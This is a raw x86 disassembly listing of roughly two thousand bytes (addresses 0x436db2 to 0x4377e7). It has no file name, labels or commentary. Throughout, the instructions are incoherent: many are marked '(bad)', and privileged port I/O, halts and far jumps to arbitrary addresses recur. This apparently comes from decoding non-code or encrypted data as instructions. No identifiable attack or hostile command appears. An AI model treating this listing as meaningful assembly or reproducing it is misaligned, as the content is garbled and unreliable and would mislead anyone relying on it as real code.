  436db2:	xor    DWORD PTR [ecx-0x57b4b],ecx
  436db8:	sbb    eax,0xeb0014
	...
  436dd5:	sub    al,0x5f
  436dd7:	lods   eax,DWORD PTR ds:[esi]
  436dd8:	or     BYTE PTR ds:0x76e80004,0x5b
  436ddf:	cmc    
  436de0:	(bad)  
  436de1:	out    dx,al
  436de2:	shr    BYTE PTR [ecx],0xc9
  436de5:	in     al,0x45
  436de7:	cld    
  436de8:	mov    DWORD PTR [edx-0x22000580],edx
  436dee:	sbb    BYTE PTR [esi-0x7c],bh
  436df1:	fld    QWORD PTR [ebx]
  436df3:	add    BYTE PTR [edi],cl
  436df5:	inc    ecx
  436df6:	rcl    DWORD PTR [ebp+0x5e],0x86
  436dfa:	pop    eax
  436dfb:	mov    esp,0xe782dd0c
  436e00:	or     ah,ah
  436e02:	add    eax,0xeef4fff7
  436e07:	push   eax
  436e08:	xchg   eax,ecx
  436e0a:	sub    bl,BYTE PTR [eax+0x4978474f]
  436e10:	das    
  436e11:	iret   
  436e12:	jne    0x436e3e
  436e14:	je     0x436e4a
  436e16:	scas   al,BYTE PTR es:[edi]
  436e17:	jnp    0x436e75
  436e19:	mov    WORD PTR [esi-0x12198ff1],fs
  436e1f:	add    ecx,DWORD PTR [ecx-0x411aadcf]
  436e25:	repz sub DWORD PTR [edx],ebp
  436e28:	add    esp,esi
  436e2a:	lods   eax,DWORD PTR ds:[esi]
  436e2b:	push   ss
  436e2c:	sub    al,0xed
  436e2f:	add    edx,DWORD PTR [eax+0x6b]
  436e32:	mov    al,0x56
  436e34:	or     eax,0x44b9adb4
	...
  436e51:	add    BYTE PTR [eax],dh
  436e53:	lods   al,BYTE PTR ds:[esi]
  436e54:	(bad)  
  436e55:	push   esp
  436e57:	adc    al,0x48
  436e59:	enter  0xd87d,0xb7
  436e5d:	mov    BYTE PTR [ecx-0x14411aa3],ah
  436e63:	and    DWORD PTR [ecx],edi
  436e65:	add    esp,esi
  436e67:	lods   eax,DWORD PTR ds:[esi]
  436e68:	dec    ebp
  436e69:	lea    edi,[ecx-0x4e72ac9f]
  436e6f:	jne    0x436ec4
  436e71:	sti    
  436e72:	inc    esp
  436e73:	and    BYTE PTR [edi+0x4f6790a],bh
  436e79:	add    ah,dh
  436e7b:	pop    edx
  436e7c:	dec    ebp
  436e7d:	dec    edi
  436e7e:	mov    ecx,ds
  436e80:	jb     0x436ec1
  436e82:	hlt    
  436e83:	inc    esi
  436e84:	adc    BYTE PTR [esp+eax*1-0x13790194],ch
  436e8b:	adc    eax,0xd31fe028
  436e90:	icebp  
  436e91:	xor    esp,0xffffffac
  436e94:	(bad)  
  436e95:	jmp    FWORD PTR [ebx]
  436e97:	add    eax,0xf5b81022
  436e9c:	test   al,0x3
  436e9e:	ins    DWORD PTR es:[edi],dx
  436e9f:	inc    eax
  436ea0:	adc    edx,ebp
  436ea2:	jp     0x436eaa
  436ea4:	gs sahf 
  436ea6:	mov    bl,0x96
  436ea8:	call   0xe8c8a2c8
  436ead:	add    esi,DWORD PTR [ebx]
  436eaf:	xor    bh,BYTE PTR [edi+0x1]
  436eb2:	or     al,0x5
  436eb4:	push   0x3
	...
  436ece:	add    ah,dh
  436ed0:	xor    edx,esp
  436ed2:	pmuludq mm5,mm7
  436ed5:	sub    BYTE PTR [ebp*2+0x3ae9dd40],al
  436edc:	adc    DWORD PTR [ecx],ecx
  436ede:	ja     0x436ea0
  436ee0:	push   esp
  436ee1:	pop    ss
  436ee2:	push   esp
  436ee3:	outs   dx,DWORD PTR ds:[esi]
  436ee4:	lock and al,0x10
  436ee7:	mov    ah,0x4
  436ee9:	ins    BYTE PTR es:[edi],dx
  436eea:	(bad)  
  436eeb:	out    0x6,eax
  436eed:	pop    esp
  436eee:	aas    
  436eef:	inc    eax
  436ef0:	xor    eax,0xf1280fa2
  436ef5:	sub    BYTE PTR [ecx+edi*2],al
  436ef8:	lds    ebx,FWORD PTR [ebx]
  436efa:	add    DWORD PTR [ebp+0x38],ebp
  436efd:	xchg   ebp,eax
  436efe:	jns    0x436ee8
  436f00:	mov    esp,0x2af443d8
  436f05:	icebp  
  436f06:	dec    esp
  436f07:	pop    ds
  436f08:	scas   eax,DWORD PTR es:[edi]
  436f09:	(bad)  
  436f0a:	stc    
  436f0b:	(bad)  
  436f0c:	mov    esp,DWORD PTR [ebx]
  436f0e:	mov    ah,0xe
  436f10:	scas   eax,DWORD PTR es:[edi]
  436f11:	mov    eax,0x6f9480a4
  436f16:	aas    
  436f17:	sbb    BYTE PTR [esi],ch
  436f19:	push   edx
  436f1a:	movups xmm6,xmm5
  436f1d:	test   al,0x3
  436f1f:	jge    0x436f60
  436f21:	push   ebp
  436f22:	jmp    0x79027fd1
  436f27:	sub    BYTE PTR [ebp-0x1],dl
  436f2a:	fdiv   DWORD PTR [edi]
  436f2c:	add    eax,0x9d232e50
  436f31:	cli    
  436f32:	aas    
	...
  436f4b:	add    BYTE PTR [edi+0x41],cl
  436f4e:	fsubr  st(2),st
  436f50:	mov    ah,0x11
  436f52:	pop    edx
  436f53:	adc    edi,0x44a9c695
  436f59:	inc    esi
  436f5a:	push   ebx
  436f5b:	push   es
  436f5c:	(bad)  [eax+0x466774fa]
  436f62:	dec    edi
  436f63:	test   dl,0x9c
  436f66:	cli    
  436f67:	aam    0x57
  436f69:	add    eax,0x560ae940
  436f6e:	jae    0x436f90
  436f70:	(bad)  
  436f71:	cmp    ah,dh
  436f73:	pop    ebp
  436f74:	nop
  436f75:	jle    0x436fc3
  436f77:	popf   
  436f78:	dec    esp
  436f79:	dec    eax
  436f7a:	mov    ah,0x72
  436f7c:	sub    dh,BYTE PTR [ebp+0xaa434fa]
  436f82:	dec    eax
  436f83:	mov    ds:0xdeb8403c,al
  436f88:	orps   xmm1,XMMWORD PTR [edi+0x38]
  436f8c:	xchg   ecx,eax
  436f8d:	adc    al,bh
  436f8f:	sahf   
  436f90:	repnz dec esp
  436f92:	adc    al,0x29
  436f94:	lock cdq 
  436f96:	je     0x436f79
  436f98:	stos   BYTE PTR es:[edi],al
  436f99:	sbb    ah,dl
  436f9b:	xchg   dl,bl
  436f9d:	test   al,0xe7
  436f9f:	inc    ah
  436fa1:	call   0x2488:0xa4d262fa
  436fa8:	jo     0x436f44
  436faa:	je     0x436ff1
  436fac:	push   eax
  436fad:	adc    al,bh
  436faf:	pop    esi
	...
  436fc8:	add    BYTE PTR [ecx],dh
  436fca:	call   0xf9db:0xf0504574
  436fd1:	aaa    
  436fd2:	add    eax,0x60a800fb
  436fd7:	cmc    
  436fd8:	adc    eax,0x3ff80d
  436fdd:	jp     0x437048
  436fdf:	adc    eax,eax
  436fe1:	lods   eax,DWORD PTR ds:[esi]
  436fe2:	dec    eax
  436fe3:	add    BYTE PTR [ecx],bh
  436fe5:	mov    al,0xc4
  436fe7:	outs   dx,BYTE PTR ds:[esi]
  436fe8:	and    BYTE PTR [ebp+0x78],ah
  436feb:	outs   dx,BYTE PTR ds:[esi]
  436fec:	inc    eax
  436fed:	int    0x69
  436fef:	jae    0x436fc5
  436ff1:	add    al,BYTE PTR [ebx]
  436ff3:	test   al,0x12
  436ff5:	pop    ebp
  436ff6:	or     BYTE PTR [ebx],dh
  436ff8:	ret    
  436ff9:	sub    DWORD PTR [ebx+0x690575f5],edx
  436fff:	retf   0x8ff
  437002:	(bad)  
  437003:	cmc    
  437004:	adc    eax,0x3a9b55
  437009:	push   es
  43700a:	ds call 0xc917336f
  437010:	ret    0x859
  437013:	dec    esi
  437014:	mov    ebp,DWORD PTR [ecx+eiz*2+0x84d0009]
  43701b:	out    dx,al
  43701c:	inc    esp
  43701d:	jmp    0x5bb77122
  437022:	into   
  437023:	out    0xbc,eax
  437025:	test   DWORD PTR [eax-0xb],ebp
  437028:	mov    ebx,DWORD PTR [ebx+0x4ba47]
	...
  437046:	dec    ebp
  437047:	add    DWORD PTR [eax+0x8],0x5a
  43704b:	(bad)  
  43704c:	jmp    0x436fda
  43704e:	fisttp QWORD PTR [eax]
  437050:	test   eax,eax
  437052:	sub    DWORD PTR [edx],eax
  437054:	or     DWORD PTR [eax],0xfffffffd
  437057:	addr16 dec edi
  437059:	or     BYTE PTR [esi-0x6dfff822],bl
  43705f:	out    dx,al
  437060:	or     edi,edi
  437062:	or     BYTE PTR [ecx+ecx*1-0x76620bc0],dh
  437069:	leave  
  43706a:	fisttp QWORD PTR [edi]
  43706c:	xchg   ebx,eax
  43706d:	cli    
  43706e:	jmp    0x4370e0
  437070:	mov    ebx,ebp
  437072:	inc    ebp
  437073:	jl     0x437046
  437075:	icebp  
  437076:	inc    edx
  437077:	je     0x4370b1
  437079:	idiv   WORD PTR [ebx+0x38]
  43707d:	push   edx
  43707e:	pop    esi
  43707f:	jmp    0x4370b6
  437081:	sti    
  437082:	jmp    0xf4836694
  437087:	mov    dh,0xc8
  437089:	jae    0x43708a
  43708b:	sar    bl,0x0
  43708e:	cmc    
  43708f:	sbb    eax,0xdde60418
  437094:	stos   BYTE PTR es:[edi],al
  437095:	xor    eax,DWORD PTR [ebx-0x7a]
  437098:	mov    ss,WORD PTR [edx]
  43709a:	xor    al,0x9e
  43709c:	es shr ah,0xdd
  4370a0:	add    ebp,eax
  4370a2:	push   0xffffffae
  4370a4:	popf   
  4370a5:	cli    
  4370a6:	outs   dx,DWORD PTR ds:[esi]
  4370a7:	mov    ch,0xd9
  4370a9:	stc    
	...
  4370c2:	add    cl,ch
  4370c4:	test   eax,0xa45fbfd4
  4370c9:	xor    ebx,edi
  4370cb:	jmp    0xb0580e71
  4370d0:	scas   al,BYTE PTR es:[edi]
  4370d1:	add    BYTE PTR ds:[edi+0x75],bh
  4370d5:	mov    DWORD PTR [edx],eax
  4370d7:	bswap  esp
  4370d9:	pop    ss
  4370da:	or     eax,0x82e72ab
  4370df:	push   es
  4370e0:	pop    esi
  4370e1:	cmp    DWORD PTR [ebx-0x2e],ebx
  4370e4:	les    eax,FWORD PTR fs:[edi]
  4370e7:	hlt    
  4370e8:	sbb    BYTE PTR [eax-0x4],dl
  4370eb:	(bad)  
  4370ee:	push   edx
  4370ef:	ret    0x35f3
  4370f2:	dec    edi
  4370f3:	stos   DWORD PTR es:[edi],eax
  4370f4:	and    ch,BYTE PTR [edi]
  4370f6:	or     al,0x7d
  4370f8:	add    al,0xac
  4370fa:	(bad)  
  4370fc:	or     esi,DWORD PTR [edx-0x4a03545e]
  437102:	mov    ds:0x43f5d108,al
  437107:	hlt    
  437108:	retf   
  437109:	mov    ebx,0xffb6690f
  43710e:	sbb    al,bl
  437110:	sbb    DWORD PTR [ebx],esp
  437112:	cmp    DWORD PTR [esi],esp
  437114:	pop    ds
  437115:	out    0x2d,al
  437117:	retf   
  437118:	cmp    BYTE PTR [ebx-0x6c6e05d3],bh
  43711e:	lahf   
  43711f:	mov    esi,0xf3f960f8
  437124:	add    al,0x64
  437126:	ret    
	...
  43713f:	add    BYTE PTR [edx+0x48],dh
  437142:	add    eax,0xf07dec17
  437147:	xor    ebx,DWORD PTR [edi+0x5faee134]
  43714d:	jle    0x4370ea
  43714f:	or     edi,DWORD PTR [ebp+0x44]
  437152:	icebp  
  437153:	push   ebx
  437154:	hlt    
  437155:	popf   
  437156:	test   BYTE PTR [edi],dh
  437158:	jae    0x4370fb
  43715a:	gs mov al,0x3
  43715d:	retf   
  43715e:	and    esp,DWORD PTR [edx+0x18a887f4]
  437164:	fbstp  TBYTE PTR ds:0xc693913
  43716a:	loope  0x4370f6
  43716c:	mov    eax,0x7d095d98
  437171:	dec    eax
  437172:	cdq    
  437173:	xchg   DWORD PTR [ebx-0x3972f8e7],eax
  437179:	mov    ecx,fs
  43717b:	pop    ecx
  43717c:	into   
  43717d:	or     BYTE PTR [esi-0x36],bl
  437180:	xor    eax,0xc048248
  437185:	shl    eax,cl
  437187:	add    esi,esp
  437189:	test   edi,edi
  43718b:	jo     0x437183
  43718d:	and    al,BYTE PTR [ebx+0x5c]
  437190:	mov    bl,0x8c
  437192:	dec    edi
  437193:	shl    DWORD PTR [edi-0x3648e5d6],cl
  437199:	(bad)  
  43719a:	cli    
  43719b:	cld    
  43719c:	dec    edi
  43719d:	cmc    
  43719e:	aas    
  43719f:	jmp    0xfbb6c316
	...
  4371bc:	add    BYTE PTR [ecx],dl
  4371be:	add    eax,0x42792a7f
  4371c3:	sti    
  4371c4:	mov    esp,0x2e663367
  4371c9:	xchg   ebp,eax
  4371ca:	clc    
  4371cb:	imul   edi,ebx,0x37
  4371ce:	add    eax,0x8dc2985
  4371d3:	ret    0x54ac
  4371d6:	add    al,0x8d
  4371d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4371d9:	pop    DWORD PTR [ecx-0x5]
  4371dc:	jl     0x43725d
  4371de:	daa    
  4371df:	sbb    dl,BYTE PTR [edi-0x23057237]
  4371e5:	das    
  4371e6:	cmc    
  4371e7:	aas    
  4371e8:	jmp    0xea3e8264
  4371ed:	jmp    0x7d91:0x5624c208
  4371f4:	scas   al,BYTE PTR es:[edi]
  4371f5:	mov    cs,WORD PTR [si-0x2b]
  4371f9:	add    al,BYTE PTR [eax-0x74ded8a6]
  4371ff:	inc    esp
  437200:	mov    edi,0x1e51522e
  437205:	adc    DWORD PTR [edi+0x78b886],0x4b8c734
  43720f:	push   ebx
  437210:	aaa    
  437211:	mov    BYTE PTR [ebp-0x1dab68e5],bh
  437217:	enter  0xc6d0,0xd1
  43721b:	fld    DWORD PTR [eax]
  43721d:	into   
  43721e:	or     BYTE PTR [ebp+0x6],dh
	...
  437239:	add    BYTE PTR [esi+ebp*1+0x8dede3b],ah
  437240:	jnp    0x437203
  437242:	adc    DWORD PTR [eax+0x5f1f18f7],ecx
  437248:	push   ebp
  437249:	pop    esi
  43724a:	into   
  43724b:	fiadd  DWORD PTR [edx+0x4dd9acec]
  437251:	mov    eax,eax
  437253:	add    BYTE PTR [ebx],ch
  437255:	fcmovnu st,st(6)
  437257:	mov    ebx,0x8ca3f331
  43725c:	add    DWORD PTR [ebp-0x2b],0xc40cba89
  437263:	int3   
  437264:	repz je 0x4372cf
  437267:	jnp    0x4372bb
  437269:	cld    
  43726a:	inc    ebp
  43726b:	mov    WORD PTR [edi],?
  43726d:	sbb    ebp,0xffffff93
  437270:	xor    esi,ecx
  437272:	(bad)  
  437273:	push   esi
  437274:	add    esi,0x5719c486
  43727a:	xchg   DWORD PTR [eax+ebp*2+0x0],eax
  43727e:	dec    ebp
  43727f:	add    al,0x0
  437281:	push   eax
  437282:	outs   dx,BYTE PTR ds:[esi]
  437283:	loop   0x43727b
  437285:	inc    DWORD PTR [eax-0x72bff608]
  43728b:	jnp    0x43727f
  43728d:	cmp    eax,DWORD PTR [esi-0x13]
  437290:	inc    esi
  437291:	mov    DWORD PTR [eax],ebx
  437293:	gs xor ebx,esi
  437296:	and    edi,DWORD PTR [ecx-0x7c9a8a7f]
  43729c:	ror    BYTE PTR [eax],0x0
	...
  4372b7:	(bad)  
  4372b8:	into   
  4372b9:	imul   DWORD PTR [eax-0x36]
  4372bc:	xor    DWORD PTR ds:0x70700200,edi
  4372c2:	cld    
  4372c3:	gs sbb bh,dh
  4372c6:	push   esp
  4372c8:	popf   
  4372c9:	xchg   DWORD PTR [edi+0x398b98a0],edi
  4372cf:	test   DWORD PTR [ebp+0x1618449a],0xe17f0442
  4372d9:	lahf   
  4372da:	jle    0x43730e
  4372dc:	scas   al,BYTE PTR es:[edi]
  4372dd:	aad    0x44
  4372df:	lock stos DWORD PTR es:[edi],eax
  4372e1:	mov    ah,0x86
  4372e3:	mov    cl,0xa1
  4372e5:	fild   DWORD PTR [eax+esi*8-0x50]
  4372e9:	push   es
  4372ea:	mov    al,0xf5
  4372ec:	inc    edx
  4372ed:	or     ch,BYTE PTR [esi]
  4372ef:	mov    ah,0x32
  4372f1:	pop    es
  4372f2:	xchg   DWORD PTR [ecx],ebp
  4372f4:	xchg   esi,eax
  4372f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4372f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4372f7:	rcl    dh,cl
  4372f9:	call   0xad57:0x3c7eb42d
  437300:	fisttp DWORD PTR [ebx]
  437302:	add    BYTE PTR [ebp-0xbc14397],dl
  437308:	and    ah,al
  43730a:	jae    0x437304
  43730c:	out    0x8,al
  43730e:	test   BYTE PTR [edi-0x222901a6],dh
  437314:	pop    esp
  437315:	(bad)  
  437316:	out    0x3,al
  437318:	cmp    eax,0xda44
	...
  437331:	add    BYTE PTR [eax],al
  437333:	add    BYTE PTR [edi],dh
  437335:	sahf   
  437336:	rol    DWORD PTR [eax+edi*2],0x5a
  43733a:	cmp    eax,0x44e4d000
  43733f:	add    BYTE PTR [edi-0xbc141e3],dl
  437345:	jl     0x437375
  437347:	fidiv  DWORD PTR [edi+0x378f5d9d]
  43734d:	fiadd  DWORD PTR [ebx]
  43734f:	mov    eax,ds:0x3eb07c
  437354:	xchg   edi,eax
  437355:	jge    0x437314
  437357:	ds hlt 
  437359:	add    al,0x48
  43735b:	push   ebx
  43735c:	loopne 0x4373a2
  43735e:	jmp    0x2606d6c5
  437363:	add    al,0x55
  437365:	fs repz inc ebx
  437368:	hlt    
  437369:	arpl   WORD PTR [eax+0x4804dac2],bp
  43736f:	addr16 call 0x3ba65cb9
  437375:	ret    
  437376:	and    eax,0xfb5c5504
  43737b:	inc    ebx
  43737c:	hlt    
  43737d:	arpl   WORD PTR [eax-0x3e],cx
  437380:	xor    al,BYTE PTR ds:0x45007388
  437386:	jmp    0xa60646ed
  43738b:	add    edx,DWORD PTR [ebp-0xbbc2c87]
  437391:	popa   
  437392:	call   0x88487e5e
  437397:	jnp    0x437399
	...
  4373b1:	call   0xeba65cfa
  4373b6:	enter  0x3a5,0x55
  4373ba:	(bad)  
  4373bd:	hlt    
  4373be:	popa   
  4373bf:	enter  0xe2c7,0x4
  4373c3:	dec    eax
  4373c4:	add    DWORD PTR [eax],0x45
  4373c7:	jmp    0xa60c572e
  4373cc:	add    edx,DWORD PTR [ebp+0x71]
  4373cf:	rol    DWORD PTR [ebx-0xc],cl
  4373d2:	popa   
  4373d3:	sub    al,cl
  4373d5:	mov    edx,0x8908804
  4373da:	inc    ebp
  4373db:	jmp    0x260c2f40
  4373e0:	add    al,0x95
  4373e2:	(bad)  
  4373e4:	inc    ebx
  4373e5:	hlt    
  4373e6:	popa   
  4373e7:	dec    eax
  4373e8:	enter  0x512,0x0
  4373ec:	mov    BYTE PTR [eax],ch
  4373ee:	hlt    
  4373ef:	aas    
  4373f0:	jmp    0x2b0791c9
  4373f5:	lock arpl bx,si
  4373f8:	hlt    
  4373f9:	mov    bh,0x4
  4373fb:	lahf   
  4373fc:	imul   edi,DWORD PTR [edi+ecx*8],0xf41847ff
  437403:	aas    
  437404:	jmp    0x2b06f19d
  437409:	clc    
  43740a:	arpl   di,bp
  43740c:	fdiv   QWORD PTR [edi+0x2c499f04]
  437412:	iret   
  437413:	inc    DWORD PTR [edi+0x0]
	...
  43742d:	add    BYTE PTR [ecx+edi*8],bl
  437430:	aas    
  437431:	jmp    0xab06d28a
  437436:	mul    DWORD PTR [ebx+0x67]
  437439:	cmc    
  43743a:	aaa    
  43743b:	add    eax,0xceac299f
  437440:	inc    DWORD PTR [edi-0x16c00700]
  437446:	push   esp
  437447:	mov    esi,0x63f7aac3
  43744c:	cmp    edi,esp
  43744e:	aaa    
  43744f:	add    eax,0xcebc099f
  437454:	inc    DWORD PTR [edi-0x5c]
  437457:	clc    
  437458:	aas    
  437459:	jmp    0xab071272
  43745e:	mul    DWORD PTR [ebx+0x63]
  437461:	aad    0x37
  437463:	add    eax,0xceb2e99f
  437468:	inc    DWORD PTR [edi-0x38]
  43746b:	clc    
  43746c:	aas    
  43746d:	jmp    0x2b087286
  437472:	clc    
  437473:	arpl   WORD PTR [edi],bp
  437475:	cld    
  437476:	mov    bh,0x4
  437478:	lahf   
  437479:	or     DWORD PTR [ebx],edi
  43747b:	into   
  43747c:	(bad)  
  43747d:	jmp    FWORD PTR [ecx+eax*2+0x15]
  437481:	inc    eax
  437482:	pop    ebp
  437483:	and    al,0x2b
  437485:	lds    ebx,FWORD PTR [esi]
  437487:	or     DWORD PTR [ecx+0x412960],esp
  43748d:	mov    ds:0x39c60d,eax
	...
  4374aa:	add    BYTE PTR [ebp+edx*8+0x241d4013],bh
  4374b1:	dec    ebx
  4374b2:	(bad)
  4374b5:	mov    eax,ds:0x413958
  4374ba:	mov    ds:0x39c5fd,eax
  4374bf:	mov    esp,0xd4013cd
  4374c4:	and    al,0x6b
  4374c6:	lds    ecx,FWORD PTR [esi+0x1]
  4374c9:	mov    eax,ds:0x48e94c
  4374ce:	mov    ds:0x39c35d,eax
  4374d3:	ins    BYTE PTR es:[edi],dx
  4374d4:	mov    al,0x13
  4374d6:	inc    eax
  4374d7:	int    0x25
  4374d9:	mov    eax,ebp
  4374db:	sahf   
  4374dc:	or     BYTE PTR [ecx+0x48a828],ah
  4374e2:	mov    ds:0x39c36d,eax
  4374e7:	sub    al,0xa4
  4374e9:	push   cs
  4374ea:	inc    eax
  4374eb:	popf   
  4374ec:	and    eax,0x85ec5ab
  4374f1:	mov    eax,ds:0x48a938
  4374f6:	mov    ds:0x39c2cd,eax
  4374fb:	cmp    al,0x90
  4374fd:	push   cs
  4374fe:	inc    eax
  4374ff:	popf   
  437500:	and    eax,0x84ec5cb
  437505:	mov    eax,ds:0x487808
  43750a:	mov    ds:0x39c63d,eax
	...
  437527:	add    ah,dh
  437529:	jl     0x4374fe
  43752b:	adc    esi,DWORD PTR [ebp+ebx*4-0x20ce109f]
  437532:	add    esp,DWORD PTR [ecx+0x3eb0e4]
  437538:	xchg   edi,eax
  437539:	sahf   
  43753a:	sar    BYTE PTR [esi],0xf4
  43753d:	jl     0x437522
  43753f:	adc    esi,DWORD PTR [ebp+ebx*4-0x20c5f09f]
  437546:	add    esp,DWORD PTR [ecx+0x3e8a84]
  43754c:	push   edi
  43754d:	mov    esi,0x3cf43ec0
  437552:	xchg   esp,eax
  437553:	adc    esi,DWORD PTR [ebp+ebx*4-0x20cdd09f]
  43755a:	add    esp,DWORD PTR [ecx+0x3eb220]
  437560:	push   edi
  437561:	pop    esi
  437562:	sar    BYTE PTR [esi],0xf4
  437565:	jl     0x43756a
  437567:	adc    al,0x34
  437569:	sahf   
  43756a:	popa   
  43756b:	dec    edi
  43756c:	mov    edx,0xcca0fe5e
  437571:	scas   al,BYTE PTR es:[edi]
  437572:	add    BYTE PTR ds:[edi-0xbc13f43],dl
  437579:	jl     0x43751a
  43757b:	adc    esi,DWORD PTR [esi+ebx*4]
  43757e:	popa   
  43757f:	outs   dx,DWORD PTR ds:[esi]
  437580:	mov    dl,0x5e
  437582:	(bad)  
  437583:	mov    al,ds:0x3e8eb0
  437588:	push   edi
  437589:	sbb    eax,0x3ebe
	...
  4375a2:	add    BYTE PTR [eax],al
  4375a4:	add    ah,dh
  4375a6:	cmp    al,0xa0
  4375a8:	push   cs
  4375a9:	xor    al,0x9e
  4375ab:	popa   
  4375ac:	(bad)  
  4375ad:	mov    edx,0xa8a0fe5e
  4375b2:	scas   al,BYTE PTR es:[edi]
  4375b3:	add    BYTE PTR ds:[edi+0x3d],dl
  4375b7:	mov    esi,0x8804f43e
  4375bc:	addr16 pop es
  4375be:	inc    ebp
  4375bf:	jmp    0x2606112a
  4375c4:	add    al,0x95
  4375c6:	mov    al,0xf4
  4375c8:	inc    ebx
  4375c9:	hlt    
  4375ca:	addr16 test al,0xc1
  4375cd:	adc    al,BYTE PTR ds:0x44e75388
  4375d3:	jmp    0x2605a93e
  4375d8:	add    al,0x95
  4375da:	jo     0x4375d8
  4375dc:	inc    ebx
  4375dd:	hlt    
  4375de:	addr16 mov cl,al
  4375e1:	jmp    0xe944:0xf36f4804
  4375e8:	sub    eax,0xc6691cdc
  4375ed:	rol    BYTE PTR [esi+eax*2],cl
  4375f0:	xchg   ebx,eax
  4375f1:	xor    eax,0xf6abe947
  4375f6:	mov    DWORD PTR [ecx-0x66],ebp
  4375f9:	cmp    dh,BYTE PTR [edi]
  4375fb:	mov    ebx,0xf65d288e
  437600:	inc    ebx
  437601:	hlt    
  437602:	sbb    al,0x59
  437604:	xchg   DWORD PTR [ebx],esp
  437606:	add    eax,0x9ab2
	...
  43761f:	add    BYTE PTR [eax],al
  437621:	add    ch,al
  437623:	sbb    eax,0x51388ed
  437628:	xchg   edx,eax
  437629:	retfw  
  43762b:	ret    
  43762c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43762d:	add    edi,DWORD PTR [edi+0x68f3c0b3]
  437633:	inc    ebp
  437634:	jmp    0x2239096b
  437639:	inc    esi
  43763a:	hlt    
  43763b:	mov    DWORD PTR [edx],edi
  43763d:	sub    edi,esp
  43763f:	ja     0x4375e9
  437641:	add    eax,DWORD PTR [edi+0x66]
  437644:	enter  0xd2c2,0x4
  437648:	cli    
  437649:	mov    al,0x13
  43764b:	in     eax,0xff
  43764d:	arpl   WORD PTR [edi],si
  43764f:	add    eax,0xc7a74a53
  437654:	ds jmp 0xe4a92ae6
  43765a:	pop    ds
  43765b:	add    eax,0x69f82ac3
  437660:	aas    
  437661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437662:	mov    cl,0x4
  437664:	call   0xfad2e2e1
  437669:	jae    0x4375f3
  43766b:	xchg   dh,dl
  43766d:	cmp    eax,0x21348f23
  437672:	xor    eax,0x3571ffcb
  437677:	(bad)  
  437678:	xor    al,0xe1
  43767a:	xor    al,0xcb
  43767c:	call   DWORD PTR [ebp+0x2ac2e233]
  437682:	lock lea esi,[ecx+eiz*8]
	...
  43769e:	add    BYTE PTR [ebx+ecx*8],dh
  4376a1:	(bad)  
  4376a2:	jge    0x4376df
  4376a4:	add    al,bl
  4376a6:	sub    bh,al
  4376a8:	pushf  
  4376a9:	sbb    eax,0x598f5cba
  4376ae:	jae    0x437669
  4376b0:	xor    bh,BYTE PTR [edi+0x1415bf64]
  4376b6:	push   0xfffffffc
  4376b8:	loopne 0x4376bd
  4376ba:	jmp    0xbe3e6eaa
  4376bf:	mov    bl,0x5
  4376c1:	push   ecx
  4376c2:	fist   DWORD PTR ds:0xa1f7a90f
  4376c9:	adc    bh,dl
  4376cb:	add    DWORD PTR [edx-0x1f0c2d40],0xfebf6403
  4376d5:	xchg   esp,eax
  4376d6:	sub    eax,DWORD PTR [ebp+0x732916b1]
  4376dc:	xor    eax,0x9ffa000e
  4376e1:	mov    esp,0x850591c2
  4376e6:	leave  
  4376e7:	add    DWORD PTR [edx-0x764e8387],ebx
  4376ed:	cli    
  4376ee:	jae    0x437758
  4376f0:	ins    BYTE PTR es:[edi],dx
  4376f1:	outs   dx,BYTE PTR ds:[esi]
  4376f2:	and    al,0x51
  4376f4:	(bad)  
  4376f5:	not    BYTE PTR ds:0x3a9675
  4376fb:	ss xchg esp,eax
  4376fd:	sub    edx,edx
  4376ff:	mov    dh,0x21
  437702:	inc    esp
	...
  43771b:	add    cl,dh
  43771d:	add    al,0x85
  43771f:	leave  
  437720:	pop    edx
  437721:	sbb    bh,BYTE PTR [ebp-0x45779a09]
  437727:	(bad)  
  437728:	icebp  
  437729:	xchg   edx,eax
  43772a:	cmc    
  43772b:	and    ebx,DWORD PTR [edi-0x41]
  43772e:	(bad)  
  43772f:	jmp    eax
  437731:	ja     0x437719
  437733:	sbb    DWORD PTR [ecx+0x75be50a9],0x47
  43773a:	cmp    DWORD PTR [eax],eax
  43773c:	jecxz  0x437701
  43773e:	add    edi,eax
  437740:	addr16 inc eax
  437742:	add    BYTE PTR [esp+ecx*1],bl
  437745:	add    eax,0x20f0ff00
  43774a:	adc    BYTE PTR [eax-0x23],al
  43774d:	pop    es
  43774e:	mov    ebx,0x100510f
  437753:	add    ch,cl
  437755:	(bad)  
  437757:	pop    eax
  437758:	hlt    
  437759:	inc    DWORD PTR [edi]
  43775b:	fistp  DWORD PTR [esi+0x8850704]
  437761:	add    al,0x0
  437763:	add    BYTE PTR [ebp-0x6e],ch
  437766:	(bad)  
  437767:	inc    ebx
  437768:	popf   
  437769:	mov    cl,0xcc
  43776b:	cmp    al,0x9c
  43776d:	test   DWORD PTR [ecx-0x5f],0x3ebcf1f4
  437774:	hlt    
  437775:	sbb    dl,BYTE PTR [edi+0x5dbb0904]
  43777b:	jmp    FWORD PTR [esi+0x36fe5b]
	...
  437799:	mov    dh,0x9
  43779b:	push   es
  43779c:	ret    0x8df1
  43779f:	mov    ebx,0xa59cf43e
  4377a4:	jnp    0x43781d
  4377a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4377a7:	add    al,0x74
  4377a9:	clc    
  4377aa:	repnz les esi,FWORD PTR [edi+eiz*8+0x25]
  4377af:	or     eax,esi
  4377b1:	fild   DWORD PTR cs:[ebx]
  4377b4:	out    0xdf,eax
  4377b6:	sbb    bl,BYTE PTR [ecx+eax*1-0x9ac837]
  4377bd:	push   ds
  4377be:	fild   DWORD PTR [ebx]
  4377c0:	aaa    
  4377c1:	ss jmp 0x6e3539d3
  4377c7:	mov    ch,0x3e
  4377c9:	hlt    
  4377ca:	cdq    
  4377cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4377cc:	push   ebx
  4377cd:	ja     0x437845
  4377cf:	add    al,0x75
  4377d1:	ret    
  4377d2:	push   edi
  4377d3:	add    al,dh
  4377d5:	fild   DWORD PTR cs:[ebx]
  4377d8:	add    cl,BYTE PTR [edi]
  4377da:	fcom   st(5)
  4377dc:	rol    BYTE PTR [eax+0x68fed2a1],0xe0
  4377e3:	fs sti 
  4377e5:	into   
  4377e6:	pop    edx
  4377e7:	(bad)  
